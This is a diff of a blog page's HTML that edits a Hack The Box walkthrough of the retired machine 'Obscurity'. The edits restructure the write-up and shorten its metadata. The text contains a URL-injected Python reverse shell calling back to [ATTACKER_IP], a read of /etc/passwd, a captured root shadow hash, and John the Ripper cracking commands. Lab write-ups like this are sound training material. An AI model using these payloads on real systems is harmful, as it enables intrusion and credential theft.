@@ -15,14 +15,14 @@
     <meta property="og:site_name" content="Inês Martins" />
     <meta property="og:type" content="article" />
     <meta property="og:title" content="HTB Write-up | Obscurity" />
-    <meta property="og:description" content="Retired machine can be found here. 1. After doing an initial scan with nmap, we find that this is a Linux (Ubuntu) machine with 2 exposed services: OpenSSH on port 22 and a custom web server on port 8080. $ nmap -sC -sV -oA obscurity.htb 22/tcp open ssh OpenSSH" />
+    <meta property="og:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
     <meta property="og:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
     <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
     <meta property="article:published_time" content="2020-06-07T17:54:05.000Z" />
-    <meta property="article:modified_time" content="2020-06-08T12:03:05.000Z" />
+    <meta property="article:modified_time" content="2020-12-08T09:53:02.000Z" />
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="HTB Write-up | Obscurity" />
-    <meta name="twitter:description" content="Retired machine can be found here. 1. After doing an initial scan with nmap, we find that this is a Linux (Ubuntu) machine with 2 exposed services: OpenSSH on port 22 and a custom web server on port 8080. $ nmap -sC -sV -oA obscurity.htb 22/tcp open ssh OpenSSH" />
+    <meta name="twitter:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
     <meta name="twitter:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
     <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
     <meta name="twitter:label1" content="Written by" />
@@ -61,14 +61,14 @@
     "headline": "HTB Write-up | Obscurity",
     "url": "https://inesmartins.github.io//htb-walkthrough-obscurity/",
     "datePublished": "2020-06-07T17:54:05.000Z",
-    "dateModified": "2020-06-08T12:03:05.000Z",
+    "dateModified": "2020-12-08T09:53:02.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "https://inesmartins.github.io//content/images/2020/06/1-1.png",
         "width": 594,
         "height": 377
     },
-    "description": "Retired machine can be found here\n[https://www.hackthebox.eu/home/machines/profile/219].\n\n1. After doing an initial scan with nmap, we find that this is a Linux (Ubuntu)\nmachine with 2 exposed services: OpenSSH on port 22 and a custom web server on\nport 8080.\n\n$ nmap -sC -sV -oA obscurity.htb\n\n22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n8080/tcp open http-proxy BadHTTPServer\n&#x60;&#x60;&#x60;\n\n2. There is some content on the website which has some useful information:\n\n3. So, n",
+    "description": "Write-up for Obscurity, a retired HTB Linux machine.",
     "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https://inesmartins.github.io//"
@@ -111,20 +111,20 @@
             </figure>
             <section class="post-content">
 
-                <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219">here</a>.</em></p><p>1. After doing an initial scan with nmap, we find that this is a Linux (Ubuntu) machine with 2 exposed services: OpenSSH on port 22 and a custom web server on port 8080.</p><pre><code>$ nmap -sC -sV -oA obscurity.htb
+                <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>After doing an initial scan with <code>nmap</code>, we find that this is a Linux (Ubuntu) machine with 2 exposed services: <code>OpenSSH</code> on port 22 and a custom web server on port 8080.</p><pre><code>$ nmap -sC -sV -A obscurity.htb
 
 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 8080/tcp open http-proxy BadHTTPServer
 ```</code></pre>
-<p>2. There is some content on the website which has some useful information:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><p>3. So, now we know there is a file called 'SuperSecureServer.py' which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> to find it but you could probably just get it logically:</p><pre><code>$ wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
+<p>There is some content on the website which has some useful information:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><p>So, now we know there is a file called <code>SuperSecureServer.py</code> which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> to find it but you could probably just get it logically:</p><pre><code>$ wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
 </code></pre>
-<p>4. The mistery directory is <strong>develop</strong>, so know we have access to the server's source code, in the form of a Python script: <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py">http://obscurity.htb:8080/develop/SuperSecureServer.py</a>.<br />While analysing it, we find something interesting:</p><figure class="kg-card kg-image-card"></figure><p>5. Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp">exec</a> and get us a shell as wwwdata.</p><pre><code>$ wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'
+<p>The mystery directory is <code>develop</code>, so know we have access to <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py">the server's source code</a>, in the form of a Python script: <br />While analysing it, we find something interesting:</p><figure class="kg-card kg-image-card"></figure><p>Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp">exec</a> and get us a shell as <code>wwwdata</code>.</p><pre><code>$ wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'
 </code></pre>
-<p>6. Our first goal is to become robert.</p><pre><code>$ cat etc/passwd
+<hr></hr><h2 id="getting-user">Getting user</h2><p>It seems like our first goal is to become <code>robert</code>.</p><pre><code>$ cat etc/passwd
 ...
 robert:x:1000:1000:robert:/home/robert:/bin/bash
 </code></pre>
-<p>7. Listing the contents of robert's home directy, we get some interesting files:</p><pre><code>$ ls /home/robert
+<p>Listing the contents of <code>robert</code>'s home directory, we get some interesting files:</p><pre><code>$ ls /home/robert
 BetterSSH/BetterSSH.py
 check.txt
 out.txt
@@ -134,26 +134,29 @@ user.txt
 </code></pre>
 <pre><code>$ cat check.txt
 Encrypting this file with your key should result in out.txt, make sure your key is correct!
+
+$ cat out.txt
+¦ÚÈêÚÞØÛÝÝ‰×ÐÊß…ÞÊÚÉ’æßÝËˆÚÛÚêÙÉëéÑÒÝÍÐ…êÆáÙÞã–ÒÑˆÐáÙ¦ÕæØžãÊÎÍßÚêÆŽÝáäè‰ÎÍÚŒÎëÑÓäáÛÌ×‰v
+
+$ cat passwordreminder.txt
+´ÑÈÌÉàÙÁÑé¯·¿
 </code></pre>
-<pre><code>$ cat out.txt
-¦ÚÈêÚÞØÛÝÝ‰×ÐÊß…ÞÊÚÉ’æßÝËˆÚÛÚêÙÉëéÑÒÝÍÐ…êÆáÙÞã–ÒÑˆÐáÙ¦ÕæØžãÊÎÍßÚêÆŽÝáäè‰ÎÍÚŒÎëÑÓäáÛÌ×‰v$$ cat passwordreminder.txt´ÑÈÌÉàÙÁÑé¯·¿
-</code></pre>
-<p>8. So, by encrypting check.txt with an unknown key we get out.txt.<br />Also, when use we this key to encrypt robert's password we get the content of passwordreminder.txt.</p><p>This is a classic <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a>.<br />Let's create a script to find the key!</p><figure class="kg-card kg-image-card"></figure><p>9. Now that we have the key ('alexandrovich'), let's use it to find robert's password!</p><figure class="kg-card kg-image-card"></figure><p>10. Now that we have robert's password we can SSH into the machine, get the user flag and move on to root. We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>:</p><pre><code>$ ./LinEnum.sh...
+<p>So, by encrypting <code>check.txt</code> with an unknown algorithm we get <code>out.txt</code>.<br />Also, when use we this key to encrypt <code>robert</code>'s password we get the content of <br /><code>passwordreminder.txt</code>.</p><p>This is a classic <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a>.<br />Let's create a script to find the key!</p><figure class="kg-card kg-image-card"></figure><p>Now that we have the key (<code>alexandrovich</code>), let's use it to find <code>robert</code>'s password!</p><figure class="kg-card kg-image-card"></figure><p>Now that we have <code>robert</code>'s password we can <code>SSH</code> into the machine, get the user flag and move on to root. </p><h2 id="getting-root">Getting root</h2><p>We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>:</p><pre><code>$ ./LinEnum.sh...
 User robert may run the following commands on obscure:
 (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 -e
 </code></pre>
-<p>11. Let's run BetterSSH as sudo to test this:</p><pre><code>$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+<p>Let's run <code>BetterSSH</code> as sudo to test this:</p><pre><code>$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 Enter username: robert
 Enter password: xxx
 Authed!
 </code></pre>
-<p>12. After looking at BetterSSH.py we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on /tmp/SSH/.</p><figure class="kg-card kg-image-card"></figure><p>13. So we create a script to print them to a file we can read after the process is finished (/tmp/o.txt):</p><figure class="kg-card kg-image-card"></figure><p>14. Finally, we use <a href="https://www.openwall.com/john/">JohnTheRipper</a> to crack the hash:</p><pre><code>$ echo "root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7" &gt; shadow
+<p>After looking at <code>BetterSSH.py</code> we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on <code>/tmp/SSH/</code>.</p><figure class="kg-card kg-image-card"></figure><p>So we create a script to print them to a file we can read after the process is finished (<code>/tmp/o.txt</code>):</p><figure class="kg-card kg-image-card"></figure><p>Finally, we use <a href="https://www.openwall.com/john/">JohnTheRipper</a> to crack the hash:</p><pre><code>$ echo "root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7" &gt; shadow
 $ echo "root:x:0:0:root:/root:/bin/bash" &gt; passwd
 $ unshadow passwd shadow &gt; crack.password.db
 $ john crack.password.db
 </code></pre>
-<p>15. That's it, hope you enjoyed it!</p>
+<p>That's it, hope you enjoyed it!</p>
 
             </section>
 
